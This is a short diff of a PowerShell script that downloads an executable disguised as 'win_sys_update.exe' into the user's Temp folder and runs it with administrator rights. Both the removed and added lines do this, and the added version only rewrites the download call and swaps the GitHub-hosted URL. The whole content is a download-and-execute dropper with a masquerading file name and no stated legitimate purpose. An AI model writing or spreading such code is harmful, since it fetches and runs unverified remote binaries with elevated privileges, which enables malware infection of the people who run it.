@@ -1,2 +1,4 @@
-(New-Object Net.WebClient).DownloadFile('https://github.com', "$env:LOCALAPPDATA\Temp\win_sys_update.exe")
-Start-Process "$env:LOCALAPPDATA\Temp\win_sys_update.exe" -Verb RunAs
+$url = "https://githubusercontent.com"
+$path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"
+Invoke-WebRequest -Uri $url -OutFile $path
+Start-Process -FilePath $path -Verb RunAs
